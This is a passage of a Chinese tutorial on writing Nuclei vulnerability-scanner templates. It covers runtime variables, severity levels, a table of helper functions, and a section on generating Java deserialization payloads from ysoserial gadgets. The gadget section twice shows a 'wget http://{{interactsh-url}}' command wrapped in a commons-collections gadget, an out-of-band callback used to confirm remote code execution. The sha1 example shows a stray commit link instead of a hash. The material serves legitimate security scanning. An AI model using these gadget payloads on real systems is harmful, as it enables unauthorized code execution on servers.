**变量以{{开头，以}}结尾，区分大小写**<br />**{{BaseURL}} **- 这将在请求的运行时替换为目标文件中指定的输入URL。<br />**{{RootURL}} **- 这将在请求的运行时替换为目标文件中指定的根URL。<br />**{{Hostname}} **- 主机名变量被主机名取代，包括运行时目标端口。<br />**{{Host}} **- 这将在请求运行时由目标文件中指定的输入主机替换。<br />**{{Port}} **- 这将在请求的运行时替换为目标文件中指定的输入端口。<br />**{{Path}} **- 这将在请求的运行时替换为目标文件中指定的输入路径。<br />**{{File}} **- 这将在请求的运行时替换为目标文件中指定的输入文件名。<br />**{{Scheme}} **- 这将在请求运行时通过目标文件中指定的协议方案替换。<br />示例：<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/27284524/1651048351928-2bbbe745-d846-49d9-800d-1716e10a26b9.png#clientId=ua9fb96e9-f7ee-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=407&id=u659e2a26&margin=%5Bobject%20Object%5D&name=image.png&originHeight=814&originWidth=716&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61931&status=done&style=none&taskId=u44f5b05d-08d8-40bc-a8c4-7d7a5e38857&title=&width=358)
<a name="jjZwi"></a>
### 5.3.3 YAML中6种安全级别都有哪些？
严重程度从高到低<br />critical,high,medium,low,info,unknown
<a name="vBHt9"></a>
## 5.4 helper-functions
<a name="tlnPL"></a>
### 5.4.1 网络socket或requests请求函数
以下是RAW请求/requests请求中可以使用的所有受支持的助手功能的列表

| 函数 | 描述 | 示例 |
| --- | --- | --- |
| base64(src interface{}) string | Base64 encodes a string | base64("Hello") // SGVsbG8= |
| base64_decode(src interface{}) []byte | Base64 decodes a string | base64_decode("SGVsbG8=") // [72 101 108 108 111] |
| base64_py(src interface{}) string | Encodes string to base64 like python (with new lines) | base64_py("Hello") // SGVsbG8=\\n |
| concat(arguments ...interface{}) string | Concatenates the given number of arguments to form a string | concat("Hello", 123, "world) // Hello123world |
| compare_versions(versionToCheck string, constraints ...string) bool | Compares the first version argument with the provided constraints | compare_versions('v1.0.0', '>v0.0.1', '<v1.0.1') // true |
| contains(input, substring interface{}) bool | Verifies if a string contains a substring | contains("Hello", "lo") // true |
| generate_java_gadget(gadget, cmd, encoding interface{}) string | Generates a Java Deserialization Gadget | generate_java_gadget("commons-collections3.1", "wget http://{{interactsh-url}}", "base64") |
| gzip(input string) string | Compresses the input using GZip | gzip("Hello") |
| gzip_decode(input string) string | Decompresses the input using GZip | gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000")) // Hello |
| zlib(input string) string | Compresses the input using Zlib | zlib("Hello") |
| zlib_decode(input string) string | Decompresses the input using Zlib | zlib_decode(hex_decode("789cf248cdc9c907040000ffff058c01f5")) // Hello |
| date(input string) string | Returns a formatted date string | date("%Y-%M-%D") // 2022-05-01 |
| time(input string) string | Returns a formatted time string | time("%H-%M") // 22-12 |
| timetostring(input int) string | Returns a formatted unix time string | timetostring(1647861438) // 2022-03-21 16:47:18 +0530 IST |
| hex_decode(input interface{}) []byte | Hex decodes the given input | hex_decode("6161") // aa |
| hex_encode(input interface{}) string | Hex encodes the given input | hex_encode("aa") // 6161 |
| html_escape(input interface{}) string | HTML escapes the given input | html_escape("<body>test</body>") // <body>test</body> |
| html_unescape(input interface{}) string | HTML un-escapes the given input | html_unescape("&lt;body&gt;test&lt;/body&gt;") // test |
| len(arg interface{}) int | Returns the length of the input | len("Hello") // 5 |
| md5(input interface{}) string | Calculates the MD5 (Message Digest) hash of the input | md5("Hello") // 8b1a9953c4611296a827abf8c47804d7 |
| mmh3(input interface{}) string | Calculates the MMH3 (MurmurHash3) hash of an input | mmh3("Hello") // 316307400 |
| print_debug(args ...interface{}) | Prints the value of a given input or expression. Used for debugging. | print_debug(1+2, "Hello") // [INF] print_debug value: [3 Hello] |
| rand_base(length uint, optionalCharSet string) string | Generates a random sequence of given length string from an optional charset (defaults to letters and numbers) | rand_base(5, "abc") // caccb |
| rand_char(optionalCharSet string) string | Generates a random character from an optional character set (defaults to letters and numbers) | rand_char("abc") // a |
| rand_int(optionalMin, optionalMax uint) int | Generates a random integer between the given optional limits (defaults to 0 - MaxInt32) | rand_int(1, 10) // 6 |
| rand_text_alpha(length uint, optionalBadChars string) string | Generates a random string of letters, of given length, excluding the optional cutset characters | rand_text_alpha(10, "abc") // WKozhjJWlJ |
| rand_text_alphanumeric(length uint, optionalBadChars string) string | Generates a random alphanumeric string, of given length without the optional cutset characters | rand_text_alphanumeric(10, "ab12") // NthI0IiY8r |
| rand_text_numeric(length uint, optionalBadNumbers string) string | Generates a random numeric string of given length without the optional set of undesired numbers | rand_text_numeric(10, 123) // 0654087985 |
| regex(pattern, input string) bool | Tests the given regular expression against the input string | regex("H([a-z]+)o", "Hello") // true |
| remove_bad_chars(input, cutset interface{}) string | Removes the desired characters from the input | remove_bad_chars("abcd", "bc") // ad |
| repeat(str string, count uint) string | Repeats the input string the given amount of times | repeat("../", 5) // ../../../../../ |
| replace(str, old, new string) string | Replaces a given substring in the given input | replace("Hello", "He", "Ha") // Hallo |
| replace_regex(source, regex, replacement string) string | Replaces substrings matching the given regular expression in the input | replace_regex("He123llo", "(\\\\d+)", "") // Hello |
| reverse(input string) string | Reverses the given input | reverse("abc") // cba |
| sha1(input interface{}) string | Calculates the SHA1 (Secure Hash 1) hash of the input | sha1("Hello") // [f7ff9e8](https://github.com/squidfunk/mkdocs-material/commit/f7ff9e8b7bb2e09b70935a5d785e0cc5d9d0abf0) |
| sha256(input interface{}) string | Calculates the SHA256 (Secure Hash 256) hash of the input | sha256("Hello") // 185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969 |
| to_lower(input string) string | Transforms the input into lowercase characters | to_lower("HELLO") // hello |
| to_upper(input string) string | Transforms the input into uppercase characters | to_upper("hello") // HELLO |
| trim(input, cutset string) string | Returns a slice of the input with all leading and trailing Unicode code points contained in cutset removed | trim("aaaHelloddd", "ad") // Hello |
| trim_left(input, cutset string) string | Returns a slice of the input with all leading Unicode code points contained in cutset removed | trim_left("aaaHelloddd", "ad") // Helloddd |
| trim_prefix(input, prefix string) string | Returns the input without the provided leading prefix string | trim_prefix("aaHelloaa", "aa") // Helloaa |
| trim_right(input, cutset string) string | Returns a string, with all trailing Unicode code points contained in cutset removed | trim_right("aaaHelloddd", "ad") // aaaHello |
| trim_space(input string) string | Returns a string, with all leading and trailing white space removed, as defined by Unicode | trim_space(" Hello ") // "Hello" |
| trim_suffix(input, suffix string) string | Returns input without the provided trailing suffix string | trim_suffix("aaHelloaa", "aa") // aaHello |
| unix_time(optionalSeconds uint) float64 | Returns the current Unix time (number of seconds elapsed since January 1, 1970 UTC) with the added optional seconds | unix_time(10) // 1639568278 |
| url_decode(input string) string | URL decodes the input string | url_decode("https:%2F%2Fprojectdiscovery.io%3Ftest=1") // [https://projectdiscovery.io?test=1](https://projectdiscovery.io/?test=1) |
| url_encode(input string) string | URL encodes the input string | url_encode("https://projectdiscovery.io/test?a=1") // https%3A%2F%2Fprojectdiscovery.io%2Ftest%3Fa%3D1 |
| wait_for(seconds uint) | Pauses the execution for the given amount of seconds | wait_for(10) // true |

<a name="aAsgs"></a>
### 5.4.2 反序列化函数
允许从ysoserial为一些常见的小工具生成有效载荷<br />**支持的 Payload:**

- dns (URLDNS)
- commons-collections3.1
- commons-collections4.0
- jdk7u21
- jdk8u20
- groovy1

**支持的编码（ encodings）:**

- base64 (default)
- gzip-base64
- gzip
- hex
- raw

**反序列化 helper function format:**<br />{{generate_java_gadget(payload, cmd, encoding}} <br />**反序列化  helper function example:**<br />{{generate_java_gadget("commons-collections3.1", "wget http://{{interactsh-url}}", "base64")}}

